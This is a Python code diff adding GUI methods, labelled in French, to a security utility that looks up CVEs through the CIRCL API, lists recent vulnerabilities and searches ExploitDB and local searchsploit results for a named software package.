+
+    def run_search_vuln(self):
+        self.clear(self.output)
+        sw = self.entry_sw.get().strip()
+        ver = self.entry_ver.get().strip()
+        if not sw:
+            messagebox.showwarning("Attention", "Entrez un logiciel.")
+            return
+        self.run_thread(lambda: self.do_search_vuln(sw, ver))
+
+    def do_search_vuln(self, sw, ver):
+        self.log(self.output, f"Recherche de vulnérabilités pour {sw} {ver}...", "bold")
+        query = f"{sw} {ver}" if ver else sw
+        try:
+            r = requests.get(f"https://cve.circl.lu/api/search/{query}", timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                if isinstance(data, list) and len(data) > 0:
+                    self.log(self.output, f"  {len(data)} vulnérabilité(s) trouvée(s):\n")
+                    for cve in data[:15]:
+                        cve_id = cve.get('id', 'N/A')
+                        cvss = cve.get('cvss', 'N/A')
+                        summ = cve.get('summary', '')[:150]
+                        tag = "error" if (cvss != 'N/A' and float(cvss) >= 7) else "warning"
+                        self.log(self.output, f"  [{cvss}] {cve_id}", tag)
+                        self.log(self.output, f"    {summ}", tag)
+                else:
+                    self.log(self.output, "  Aucun résultat.", "warning")
+            else:
+                self.log(self.output, f"  Erreur API (HTTP {r.status_code})", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+
+    def run_search_exploitdb(self):
+        self.clear(self.output)
+        sw = self.entry_sw.get().strip()
+        if not sw:
+            messagebox.showwarning("Attention", "Entrez un logiciel.")
+            return
+        self.run_thread(lambda: self.do_search_exploitdb(sw))
+
+    def do_search_exploitdb(self, sw):
+        self.log(self.output, f"Recherche ExploitDB pour '{sw}'...", "bold")
+        try:
+            r = requests.get(f"https://www.exploit-db.com/search?q={sw}", timeout=10,
+                           headers={"User-Agent": "Mozilla/5.0"})
+            if r.status_code == 200:
+                self.log(self.output, f"  Site accessible. Recherche manuelle via:", "success")
+                self.log(self.output, f"  → https://www.exploit-db.com/search?q={sw}")
+                self.log(self.output, f"  → searchsploit {sw} (local)")
+                self.log(self.output, f"\n  Ou utilisez l'API GHDB:")
+                r2 = requests.get(f"https://gist.github.com/search?q={sw}+exploit", timeout=10)
+                self.log(self.output, f"  https://github.com/search?q={sw}+exploit")
+            else:
+                self.log(self.output, "  Site inaccessible.", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+        try:
+            result = subprocess.run(["searchsploit", sw], capture_output=True, text=True, timeout=10)
+            if result.stdout.strip():
+                self.log(self.output, "\n  Résultats searchsploit local:", "bold")
+                for line in result.stdout.split("\n")[:20]:
+                    self.log(self.output, f"  {line}")
+            else:
+                self.log(self.output, "  searchsploit: aucun résultat local.", "warning")
+        except FileNotFoundError:
+            self.log(self.output, "  searchsploit non installé (sudo apt install exploitdb)", "warning")
+        except Exception as e:
+            self.log(self.output, f"  searchsploit: {e}", "warning")
+
+    def run_top_cves(self):
+        self.clear(self.output)
+        self.run_thread(self.do_top_cves)
+
+    def do_top_cves(self):
+        self.log(self.output, "Top vulnérabilités récentes (NVD):", "bold")
+        try:
+            r = requests.get("https://cve.circl.lu/api/last", timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                if isinstance(data, list):
+                    for cve in data[:20]:
+                        cve_id = cve.get('id', 'N/A')
+                        cvss = cve.get('cvss', 'N/A')
+                        summ = cve.get('summary', '')[:120]
+                        tag = "error" if (cvss != 'N/A' and float(cvss) >= 9) else "warning"
+                        self.log(self.output, f"  [{cvss}] {cve_id}", tag)
+                        self.log(self.output, f"    {summ}")
+            else:
+                self.log(self.output, "  Erreur API.", "warning")
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
 
 
 # ════════════════════════ MAIN ════════════════════════
